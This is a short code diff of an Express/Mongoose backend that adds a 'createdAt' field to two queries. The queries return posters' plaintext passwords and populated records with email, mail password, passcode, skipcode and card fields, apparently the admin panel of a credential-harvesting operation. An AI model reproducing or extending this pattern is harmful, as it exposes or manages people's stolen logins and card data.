@@ -447,7 +447,7 @@ export const all_poster = async (req, res) => {
             .populate({
                 path: 'posters',
                 model: 'Poster',
-                select: 'username password links posterId',
+                select: 'username password links posterId createdAt',
 
             }).sort({ createdAt: -1 })
         return res.status(200).json({ data: data[0] })
@@ -469,7 +469,7 @@ export const poster_details = async (req, res) => {
     try {
 
         const data = await Poster.findOne({ _id: id })
-            .select('username password posterId links details')
+            .select('username password posterId links createdAt details')
             .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
         return res.status(200).json({ data: data })
 
